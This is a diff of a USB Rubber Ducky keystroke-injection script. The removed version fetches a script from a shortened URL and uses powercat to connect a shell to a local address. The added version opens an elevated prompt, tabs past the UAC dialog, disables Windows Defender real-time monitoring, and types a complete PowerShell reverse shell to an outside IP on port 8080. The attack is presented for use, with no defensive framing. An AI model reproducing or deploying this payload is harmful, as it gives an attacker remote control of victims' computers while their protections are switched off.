@@ -1,15 +1,22 @@
-REM This first delay stalls the Ducky for 5.5 seconds to give the target
-REM operating system some time to mount the USB as a keyboard device.
-DELAY 5500
-REM Opens the Windows Run prompt.
 WINDOWS
-REM Delays .7 seconds to give the Run prompt time to open.
-DELAY 700
-REM Types the PowerShell payload.
-STRING powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.0.208 -p 1234 -e powershell
-REM Presses Ctrl + Shirt + Enter to execute the PowerShell with administrative privileges.
+DELAY 500
+STRING cmd
+DELAY 500
 CTRL-SHIFT ENTER
-REM Delay .85 seconds to give the UAC prompt time to open.
-DELAY 850
-REM Presses Alt + Y to bypass UAC.
-ALT y
+DELAY 500
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 300
+ENTER
+DELAY 300
+STRING $client = New-Object System.Net.Sockets.TCPClient('193.106.55.114',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);try { $sendback = (iex ". { $data } 2>&1" | Out-String ); } catch { $sendback = "$_`n"}; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+DELAY 300
+ENTER
